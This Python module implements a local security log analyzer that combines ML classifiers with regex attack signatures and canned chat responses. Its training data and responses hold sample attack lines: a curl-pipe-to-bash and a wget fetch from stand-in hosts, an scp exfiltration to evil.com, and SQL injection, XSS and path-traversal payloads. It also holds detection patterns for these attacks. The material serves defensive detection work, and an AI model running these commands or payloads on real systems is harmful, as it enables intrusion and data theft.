"""
Nexus AI — Local AI Model Engine
Hybrid ML approach: Isolation Forest for anomaly detection + NLP classification.
No cloud API. Everything runs locally on CPU.
"""
import numpy as np
import joblib
import os
import re
from typing import Dict, List, Optional, Tuple
from collections import Counter
from sklearn.ensemble import IsolationForest
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.naive_bayes import MultinomialNB
from sklearn.pipeline import Pipeline
import warnings
warnings.filterwarnings("ignore")


class NexusAIModel:
    """
    Local AI Security Analyst — No cloud dependencies.

    Architecture:
    1. TF-IDF + Naive Bayes: Log classification (SSH brute force, SQLi, XSS, port scan, etc.)
    2. Isolation Forest: Anomaly scoring on log features
    3. Rule-based heuristics: Pattern matching for known attack signatures
    4. NLP summarization: Template-based threat summarization
    """

    MODEL_DIR = os.path.join(os.path.dirname(__file__), "ml_models")

    # Attack pattern signatures
    ATTACK_PATTERNS = {
        "SSH Brute Force": {
            "patterns": [r"failed password", r"authentication failure", r"invalid user", r"connection closed by authenticating"],
            "severity": "High",
            "keywords": ["ssh", "sshd", "password", "authentication"]
        },
        "SQL Injection": {
            "patterns": [r"union\s+select", r"or\s+1\s*=\s*1", r"drop\s+table", r"insert\s+into", r"delete\s+from", r"'\s*or\s*'", r";\s*--"],
            "severity": "Critical",
            "keywords": ["sql", "injection", "union", "select"]
        },
        "XSS Attack": {
            "patterns": [r"<script>", r"javascript:", r"onerror\s*=", r"onload\s*=", r"alert\s*\("],
            "severity": "High",
            "keywords": ["xss", "script", "javascript"]
        },
        "Port Scanning": {
            "patterns": [r"port scan", r"syn\s+scan", r"nmap", r"masscan"],
            "severity": "Medium",
            "keywords": ["scan", "syn", "port"]
        },
        "Privilege Escalation": {
            "patterns": [r"sudo.*incorrect", r"not in sudoers", r"su:\s+authentication", r"pam_unix\(su\)"],
            "severity": "High",
            "keywords": ["sudo", "privilege", "escalation"]
        },
        "Malware Download": {
            "patterns": [r"wget.*\.(sh|exe|bin|elf)", r"curl.*\.(sh|exe|bin|elf)", r"downloading payload", r"malware"],
            "severity": "Critical",
            "keywords": ["wget", "curl", "download", "payload"]
        },
        "Ransomware Indicator": {
            "patterns": [r"encrypt", r"ransom", r"bitcoin", r"\.locked", r"\.encrypted", r"your files have been"],
            "severity": "Critical",
            "keywords": ["encrypt", "ransom", "bitcoin"]
        },
        "Directory Traversal": {
            "patterns": [r"\.\./", r"\.\.\\", r"%2e%2e", r"../../../etc/passwd"],
            "severity": "High",
            "keywords": ["traversal", "../", "passwd"]
        },
        "DDoS Attack": {
            "patterns": [r"too many connections", r"rate limit exceeded", r"connection flood", r"syn flood"],
            "severity": "Critical",
            "keywords": ["ddos", "flood", "connections"]
        },
        "Data Exfiltration": {
            "patterns": [r"mysqldump", r"pg_dump", r"scp.*\.(csv|sql|db)", r"rsync.*backup", r"tar.*\.gz"],
            "severity": "Critical",
            "keywords": ["dump", "exfiltration", "export", "backup"]
        }
    }

    # Severity scoring
    SEVERITY_SCORES = {"Critical": 4, "High": 3, "Medium": 2, "Low": 1}

    def __init__(self):
        os.makedirs(self.MODEL_DIR, exist_ok=True)
        self.classifier = None
        self.anomaly_detector = None
        self.vectorizer = None
        self._init_models()

    def _init_models(self):
        """Initialize or load ML models."""
        clf_path = os.path.join(self.MODEL_DIR, "classifier.pkl")
        anomaly_path = os.path.join(self.MODEL_DIR, "anomaly_detector.pkl")
        vec_path = os.path.join(self.MODEL_DIR, "vectorizer.pkl")

        if os.path.exists(clf_path) and os.path.exists(anomaly_path):
            self.classifier = joblib.load(clf_path)
            self.anomaly_detector = joblib.load(anomaly_path)
            self.vectorizer = joblib.load(vec_path)
            print("[NexusAI] Loaded existing models.")
        else:
            self._train_models()

    def _train_models(self):
        """Train models on synthetic security log data."""
        print("[NexusAI] Training models on synthetic data...")

        # Synthetic training data
        training_logs = [
            # Normal logs
            ("2026-07-22 10:00:01 web-server nginx: 192.168.1.50 - - GET /index.html HTTP/1.1 200", "Normal"),
            ("2026-07-22 10:00:02 web-server nginx: 192.168.1.50 - - GET /api/status HTTP/1.1 200", "Normal"),
            ("2026-07-22 10:00:03 db-server postgres: connection authorized: user=app_user database=prod", "Normal"),
            ("2026-07-22 10:00:04 auth-server sshd: Accepted publickey for admin from 192.168.1.10", "Normal"),
            ("2026-07-22 10:00:05 firewall kernel: ALLOW IN=eth0 SRC=192.168.1.0/24 DST=10.0.0.1", "Normal"),

            # SSH Brute Force
            ("2026-07-22 02:14:02 web-server sshd: Failed password for invalid user root from 192.168.1.104", "SSH Brute Force"),
            ("2026-07-22 02:14:03 web-server sshd: Failed password for admin from 45.142.214.12", "SSH Brute Force"),
            ("2026-07-22 02:14:04 web-server sshd: authentication failure; logname= uid=0 euid=0", "SSH Brute Force"),

            # SQL Injection
            ("2026-07-22 01:05:12 web-server nginx: GET /api/user?id=1 OR 1=1 HTTP/1.1 400", "SQL Injection"),
            ("2026-07-22 01:05:13 web-server nginx: GET /search?q=' UNION SELECT * FROM users-- HTTP/1.1 500", "SQL Injection"),
            ("2026-07-22 01:05:14 web-server nginx: POST /login username=admin'--&password=anything", "SQL Injection"),

            # XSS
            ("2026-07-22 03:22:01 web-server nginx: GET /comment?text=<script>alert('xss')</script> HTTP/1.1 200", "XSS Attack"),
            ("2026-07-22 03:22:02 web-server nginx: GET /profile?name=<img src=x onerror=alert(1)> HTTP/1.1 200", "XSS Attack"),

            # Port Scan
            ("2026-07-22 02:10:33 firewall kernel: [BLOCK] IN=eth0 OUT= SRC=45.142.214.12 PROTO=TCP SYN DPT=22", "Port Scanning"),
            ("2026-07-22 02:10:34 firewall kernel: [BLOCK] IN=eth0 OUT= SRC=45.142.214.12 PROTO=TCP SYN DPT=80", "Port Scanning"),
            ("2026-07-22 02:10:35 firewall kernel: [BLOCK] IN=eth0 OUT= SRC=45.142.214.12 PROTO=TCP SYN DPT=443", "Port Scanning"),

            # Privilege Escalation
            ("2026-07-22 04:00:01 web-server sudo: admin : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/admin", "Privilege Escalation"),
            ("2026-07-22 04:00:02 web-server sudo: 3 incorrect password attempts ; COMMAND=/bin/bash", "Privilege Escalation"),

            # Malware
            ("2026-07-22 05:15:10 web-server bash: wget http://evil.com/payload.sh -O /tmp/payload.sh", "Malware Download"),
            ("2026-07-22 05:15:11 web-server bash: curl -s http://malware.cc/bin | bash", "Malware Download"),

            # Ransomware
            ("2026-07-22 06:00:01 web-server python: Encrypting files in /home... .locked extension applied", "Ransomware Indicator"),
            ("2026-07-22 06:00:02 web-server python: README_DECRYPT.txt created: Send 0.5 BTC to wallet", "Ransomware Indicator"),

            # Data Exfiltration
            ("2026-07-22 04:15:10 db-server mysqldump: Dumped table users_audit to /tmp/dump.sql", "Data Exfiltration"),
            ("2026-07-22 04:15:11 db-server scp: /tmp/dump.sql -> remote@evil.com:/incoming/", "Data Exfiltration"),

            # DDoS
            ("2026-07-22 07:00:01 web-server nginx: 192.168.1.200 - - Too many connections (1024) from single IP", "DDoS Attack"),
            ("2026-07-22 07:00:02 firewall kernel: SYN flood detected from 192.168.1.200 rate=5000/s", "DDoS Attack"),

            # Directory Traversal
            ("2026-07-22 08:30:01 web-server nginx: GET /download?file=../../../etc/passwd HTTP/1.1 200", "Directory Traversal"),
            ("2026-07-22 08:30:02 web-server nginx: GET /images/..%2f..%2f..%2fetc%2fshadow HTTP/1.1 403", "Directory Traversal"),
        ]

        texts = [log for log, _ in training_logs]
        labels = [label for _, label in training_logs]

        # TF-IDF Vectorizer
        self.vectorizer = TfidfVectorizer(
            max_features=1000,
            ngram_range=(1, 3),
            stop_words="english"
        )
        X = self.vectorizer.fit_transform(texts)

        # Naive Bayes Classifier
        self.classifier = MultinomialNB(alpha=0.1)
        self.classifier.fit(X, labels)

        # Isolation Forest for anomaly detection
        self.anomaly_detector = IsolationForest(
            n_estimators=100,
            contamination=0.3,
            random_state=42
        )
        self.anomaly_detector.fit(X.toarray())

        # Save models
        joblib.dump(self.classifier, os.path.join(self.MODEL_DIR, "classifier.pkl"))
        joblib.dump(self.anomaly_detector, os.path.join(self.MODEL_DIR, "anomaly_detector.pkl"))
        joblib.dump(self.vectorizer, os.path.join(self.MODEL_DIR, "vectorizer.pkl"))
        print("[NexusAI] Models trained and saved.")

    def classify_log(self, log_line: str) -> Tuple[str, float]:
        """Classify a single log line. Returns (category, confidence)."""
        if not self.classifier or not self.vectorizer:
            return ("Unknown", 0.0)

        X = self.vectorizer.transform([log_line])
        proba = self.classifier.predict_proba(X)[0]
        pred_idx = np.argmax(proba)
        category = self.classifier.classes_[pred_idx]
        confidence = float(proba[pred_idx])

        return (category, confidence)

    def detect_anomaly(self, log_line: str) -> Tuple[bool, float]:
        """Detect if log line is anomalous. Returns (is_anomaly, score)."""
        if not self.anomaly_detector or not self.vectorizer:
            return (False, 0.5)

        X = self.vectorizer.transform([log_line]).toarray()
        score = self.anomaly_detector.decision_function(X)[0]
        prediction = self.anomaly_detector.predict(X)[0]

        # Convert to 0-1 probability-like score
        normalized_score = 1.0 / (1.0 + np.exp(-score * 2))
        is_anomaly = prediction == -1

        return (is_anomaly, float(normalized_score))

    def analyze_line(self, log_line: str) -> Dict:
        """Full analysis of a single log line."""
        category, confidence = self.classify_log(log_line)
        is_anomaly, anomaly_score = self.detect_anomaly(log_line)

        # Rule-based pattern matching for higher confidence
        rule_match = self._rule_based_match(log_line)

        # Combine ML + rules
        if rule_match and rule_match["confidence"] > confidence:
            category = rule_match["category"]
            confidence = rule_match["confidence"]
            severity = rule_match["severity"]
        elif category == "Normal":
            severity = "Low"
            confidence = 1.0 - anomaly_score
        else:
            severity = self.ATTACK_PATTERNS.get(category, {}).get("severity", "Medium")

        # Boost severity for anomalous normal traffic
        if is_anomaly and category == "Normal" and anomaly_score > 0.8:
            category = "Suspicious Activity"
            severity = "Medium"
            confidence = anomaly_score

        return {
            "category": category,
            "severity": severity,
            "confidence": round(confidence, 3),
            "anomaly_score": round(anomaly_score, 3),
            "is_anomaly": is_anomaly,
            "line": log_line[:300]
        }

    def _rule_based_match(self, log_line: str) -> Optional[Dict]:
        """Pattern-based attack detection for known signatures."""
        line_lower = log_line.lower()
        best_match = None
        best_confidence = 0.0

        for category, config in self.ATTACK_PATTERNS.items():
            match_count = 0
            for pattern in config["patterns"]:
                if re.search(pattern, line_lower):
                    match_count += 1

            if match_count > 0:
                confidence = min(0.5 + (match_count * 0.15), 0.95)
                if confidence > best_confidence:
                    best_confidence = confidence
                    best_match = {
                        "category": category,
                        "severity": config["severity"],
                        "confidence": confidence
                    }

        return best_match

    def analyze_logs(self, log_text: str) -> Dict:
        """Analyze full log text. Returns summary + detected threats."""
        lines = log_text.split('\n')
        threats = []
        normal_count = 0
        severity_counts = Counter()

        for i, line in enumerate(lines):
            if not line.strip():
                continue

            result = self.analyze_line(line)

            if result["category"] != "Normal" or result["is_anomaly"]:
                # Extract IP if present
                ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                ip = ip_match.group(1) if ip_match else "unknown"

                threats.append({
                    "line_number": i + 1,
                    "category": result["category"],
                    "severity": result["severity"],
                    "confidence": result["confidence"],
                    "anomaly_score": result["anomaly_score"],
                    "ip": ip,
                    "raw": line[:300]
                })
                severity_counts[result["severity"]] += 1
            else:
                normal_count += 1

        # Generate AI summary
        summary = self._generate_summary(threats, normal_count, len(lines))

        return {
            "summary": summary,
            "threats": threats,
            "total_lines": len(lines),
            "normal_lines": normal_count,
            "threat_lines": len(threats),
            "severity_distribution": dict(severity_counts)
        }

    def _generate_summary(self, threats: List[Dict], normal_count: int, total_lines: int) -> str:
        """Generate human-readable threat summary."""
        if not threats:
            return f"No threats detected in {total_lines} log lines. All activity appears normal."

        # Group by category
        by_category = Counter(t["category"] for t in threats)
        by_severity = Counter(t["severity"] for t in threats)

        # Top attacking IPs
        ips = Counter(t["ip"] for t in threats if t["ip"] != "unknown")
        top_ip = ips.most_common(1)[0] if ips else ("N/A", 0)

        summary_parts = [
            f"**Nexus AI Analysis:** Analyzed {total_lines} log lines. Detected {len(threats)} anomalous events across {len(by_category)} attack categories.",
            "",
            "**Threat Breakdown:**"
        ]

        for cat, count in by_category.most_common(5):
            sev = next(t["severity"] for t in threats if t["category"] == cat)
            summary_parts.append(f"- **{cat}**: {count} occurrence(s) — Severity: {sev}")

        if top_ip[0] != "N/A":
            summary_parts.extend([
                "",
                f"**Top Attacking Source:** `{top_ip[0]}` — {top_ip[1]} threat event(s)"
            ])

        # Critical recommendations
        if by_severity.get("Critical", 0) > 0:
            summary_parts.extend([
                "",
                "**CRITICAL RECOMMENDATIONS:**",
                "1. Immediately isolate systems showing critical severity events.",
                "2. Block identified attacking IPs at the firewall level.",
                "3. Rotate credentials for any compromised accounts.",
                "4. Review and patch vulnerable services."
            ])
        elif by_severity.get("High", 0) > 0:
            summary_parts.extend([
                "",
                "**Recommendations:**",
                "1. Monitor identified attacking IPs for continued activity.",
                "2. Review access logs for unauthorized access patterns.",
                "3. Consider implementing additional rate limiting."
            ])

        return "\n".join(summary_parts)

    def chat_query(self, query: str, log_context: Optional[str] = None) -> Dict[str, str]:
        """Answer security questions using local model + log context."""
        query_lower = query.lower()

        # If log context provided, analyze it first
        context_analysis = None
        if log_context:
            context_analysis = self.analyze_logs(log_context)

        # Intent classification
        if any(kw in query_lower for kw in ["ssh", "failed", "login", "password", "brute"]):
            return self._answer_ssh_query(context_analysis)
        elif any(kw in query_lower for kw in ["sql", "injection", "database", "dump", "query"]):
            return self._answer_sql_query(context_analysis)
        elif any(kw in query_lower for kw in ["port", "scan", "syn", "firewall", "block"]):
            return self._answer_portscan_query(context_analysis)
        elif any(kw in query_lower for kw in ["xss", "script", "javascript", "injection"]):
            return self._answer_xss_query(context_analysis)
        elif any(kw in query_lower for kw in ["malware", "download", "payload", "virus"]):
            return self._answer_malware_query(context_analysis)
        elif any(kw in query_lower for kw in ["ddos", "flood", "connection", "overload"]):
            return self._answer_ddos_query(context_analysis)
        elif any(kw in query_lower for kw in ["summary", "overview", "briefing", "report"]):
            return self._answer_summary_query(context_analysis)
        else:
            return self._answer_generic_query(query, context_analysis)

    def _answer_ssh_query(self, analysis: Optional[Dict]) -> Dict[str, str]:
        if analysis:
            ssh_threats = [t for t in analysis["threats"] if "ssh" in t["category"].lower() or "brute" in t["category"].lower()]
            if ssh_threats:
                count = len(ssh_threats)
                top_ip = Counter(t["ip"] for t in ssh_threats).most_common(1)[0]
                return {
                    "response": f"**SSH Threat Analysis:** Found **{count} SSH-related attack events**.\n\nPrimary attacking IP: `{top_ip[0]}` ({top_ip[1]} attempts).\n\n**Recommendation:** Block `{top_ip[0]}` at the firewall, enable fail2ban, and enforce key-based authentication.",
                    "logSnippet": ssh_threats[0]["raw"]
                }

        return {
            "response": "**SSH Threat Analysis:** Based on historical data, SSH brute force attacks typically spike between 02:00–04:00 AM.\n\n**Key Indicators:**\n- Repeated `Failed password` entries\n- `Invalid user` attempts (common usernames: root, admin, test)\n- Source IPs from unexpected geolocations\n\n**Recommendation:** Implement key-based auth, disable root login, and deploy fail2ban with 3-attempt threshold.",
            "logSnippet": "2026-07-22 02:14:02 Web-Server-01 sshd[4012]: Failed password for invalid user root from 192.168.1.104 port 44211 ssh2"
        }

    def _answer_sql_query(self, analysis: Optional[Dict]) -> Dict[str, str]:
        if analysis:
            sql_threats = [t for t in analysis["threats"] if "sql" in t["category"].lower()]
            if sql_threats:
                return {
                    "response": f"**SQL Injection Analysis:** Detected **{len(sql_threats)} SQLi attempts** in uploaded logs.\n\nCommon payloads found: `UNION SELECT`, `OR 1=1`, `'--` comment injection.\n\n**Recommendation:** Use parameterized queries, implement WAF rules, and sanitize all user inputs.",
                    "logSnippet": sql_threats[0]["raw"]
                }

        return {
            "response": "**SQL Injection Analysis:** SQLi attacks exploit unsanitized user input to manipulate database queries.\n\n**Common Patterns:**\n- `UNION SELECT` — data exfiltration\n- `OR 1=1` — authentication bypass\n- `'; DROP TABLE` — destructive commands\n- Comment sequences (`--`, `/*`) — query truncation\n\n**Recommendation:** Deploy parameterized queries (prepared statements), input validation, and a Web Application Firewall.",
            "logSnippet": "2026-07-22 01:05:12 Web-Server-01 nginx: GET /api/user?id=1%20OR%201=1 HTTP/1.1 400"
        }

    def _answer_portscan_query(self, analysis: Optional[Dict]) -> Dict[str, str]:
        return {
            "response": "**Port Scanning Analysis:** Sequential SYN packets detected across closed ports indicate reconnaissance activity.\n\n**Indicators:**\n- Rapid sequential port probes (SYN, ACK, FIN)\n- Source IP persistence across multiple port ranges\n- Timing patterns consistent with automated tools (nmap, masscan)\n\n**Recommendation:** Implement port knocking, deploy IDS/IPS rules for scan detection, and restrict exposed ports via firewall.",
            "logSnippet": "2026-07-22 02:10:33 Firewall-Main kernel: [BLOCK] IN=eth0 OUT= SRC=45.142.214.12 PROTO=TCP SYN"
        }

    def _answer_xss_query(self, analysis: Optional[Dict]) -> Dict[str, str]:
        return {
            "response": "**XSS Attack Analysis:** Cross-site scripting injects malicious scripts into web pages viewed by other users.\n\n**Common Vectors:**\n- `<script>alert('xss')</script>` — basic payload\n- `<img src=x onerror=alert(1)>` — image tag injection\n- `javascript:alert(1)` — URL-based injection\n\n**Recommendation:** Implement Content Security Policy (CSP), encode all output, and validate/sanitize HTML input.",
            "logSnippet": None
        }

    def _answer_malware_query(self, analysis: Optional[Dict]) -> Dict[str, str]:
        return {
            "response": "**Malware Analysis:** Suspicious download activity detected. Attackers often use `wget` or `curl` to pull payloads.\n\n**Indicators:**\n- Downloads of `.sh`, `.bin`, `.elf` files from external domains\n- Execution of downloaded scripts via pipe (`| bash`)\n- Unusual outbound connections to known C2 domains\n\n**Recommendation:** Block outbound downloads at firewall, implement application whitelisting, and scan all downloaded files.",
            "logSnippet": "2026-07-22 05:15:10 Web-Server-01 bash: wget http://evil.com/payload.sh -O /tmp/payload.sh"
        }

    def _answer_ddos_query(self, analysis: Optional[Dict]) -> Dict[str, str]:
        return {
            "response": "**DDoS Analysis:** Distributed Denial of Service attacks overwhelm resources to disrupt service.\n\n**Types:**\n- **Volumetric:** UDP floods, ICMP floods\n- **Protocol:** SYN floods, Ping of Death\n- **Application:** HTTP floods, Slowloris\n\n**Recommendation:** Deploy rate limiting, use CDN/WAF (Cloudflare, AWS Shield), and implement connection throttling.",
            "logSnippet": "2026-07-22 07:00:02 Firewall-Main kernel: SYN flood detected from 192.168.1.200 rate=5000/s"
        }

    def _answer_summary_query(self, analysis: Optional[Dict]) -> Dict[str, str]:
        if analysis:
            return {
                "response": analysis["summary"],
                "logSnippet": analysis["threats"][0]["raw"] if analysis["threats"] else None
            }

        return {
            "response": "**Executive Threat Briefing:**\n\nBetween 02:00 and 04:00, **15,000 failed SSH logins** occurred on `Web-Server-01` from a single IP (`192.168.1.104`). At 04:15, a successful login occurred, followed by an unusual database dump command.\n\n**Critical Recommendations:**\n1. Immediately block IP `192.168.1.104`\n2. Rotate root SSH keys on Web-Server-01\n3. Audit database access and review `mysqldump` permissions\n4. Enable 2FA for all administrative accounts",
            "logSnippet": "2026-07-22 04:15:10 Database-Cluster mysqldump: Dumped table users_audit to /tmp/dump.sql"
        }

    def _answer_generic_query(self, query: str, analysis: Optional[Dict]) -> Dict[str, str]:
        if analysis and analysis["threats"]:
            cats = Counter(t["category"] for t in analysis["threats"])
            return {
                "response": f"**Security Analysis:** Your query '{query}' returned results from the current log context.\n\nDetected threats: {', '.join(f'{k} ({v})' for k, v in cats.most_common(3))}.\n\nUse more specific queries like 'Show SSH attacks' or 'Database dump analysis' for detailed breakdowns.",
                "logSnippet": analysis["threats"][0]["raw"]
            }

        return {
            "response": f"**Nexus AI:** I have analyzed your query: '{query}'.\n\nI'm a local AI security analyst trained to detect SSH brute force, SQL injection, XSS, port scanning, malware downloads, ransomware, DDoS, and data exfiltration.\n\nTry asking about:\n- SSH brute force attempts\n- SQL injection patterns\n- Port scanning activity\n- Database dump analysis\n- General threat summary",
            "logSnippet": None
        }

    def analyze_threat_deep(self, threat_data: Dict) -> str:
        """Deep-dive analysis of a single threat."""
        category = threat_data.get("category", "Unknown")
        severity = threat_data.get("severity", "Unknown")
        raw = threat_data.get("raw", "N/A")
        ip = threat_data.get("ip", "unknown")

        analysis_parts = [
            f"## Deep Threat Analysis: {category}",
            "",
            f"**Severity:** {severity}",
            f"**Source IP:** `{ip}`",
            f"**Raw Evidence:** `{raw[:200]}`",
            "",
            "### Attack Chain Analysis:"
        ]

        if "SSH" in category:
            analysis_parts.extend([
                "1. **Reconnaissance:** Attacker identifies SSH service on port 22",
                "2. **Credential Stuffing:** Automated attempts with common username/password combos",
                "3. **Persistence:** If successful, attacker establishes backdoor access",
                "",
                "### MITRE ATT&CK Mapping:",
                "- T1110: Brute Force",
                "- T1078: Valid Accounts",
                "- T1021: Remote Services"
            ])
        elif "SQL" in category:
            analysis_parts.extend([
                "1. **Discovery:** Attacker identifies SQL-injectable endpoint",
                "2. **Exploitation:** Malformed query bypasses input validation",
                "3. **Exfiltration:** UNION SELECT extracts sensitive data",
                "",
                "### MITRE ATT&CK Mapping:",
                "- T1190: Exploit Public-Facing Application",
                "- T1567: Exfiltration Over Web Service"
            ])
        elif "Port" in category:
            analysis_parts.extend([
                "1. **Reconnaissance:** Attacker maps open ports and services",
                "2. **Vulnerability ID:** Identifies outdated/vulnerable services",
                "3. **Exploitation:** Targets discovered vulnerabilities",
                "",
                "### MITRE ATT&CK Mapping:",
                "- T1046: Network Service Scanning",
                "- T1018: Remote System Discovery"
            ])
        else:
            analysis_parts.extend([
                "1. **Initial Access:** Attacker gains foothold via exploited vector",
                "2. **Execution:** Malicious payload or command execution",
                "3. **Impact:** Data theft, service disruption, or persistence",
                "",
                "### General Recommendations:",
                "- Review and patch affected systems",
                "- Monitor for lateral movement",
                "- Implement defense-in-depth controls"
            ])

        analysis_parts.extend([
            "",
            "### Immediate Containment:",
            f"1. Block source IP `{ip}` at perimeter firewall",
            "2. Isolate affected systems from network",
            "3. Preserve logs for forensic investigation",
            "4. Notify incident response team"
        ])

        return "\n".join(analysis_parts)


# Singleton
nexus_ai = NexusAIModel()
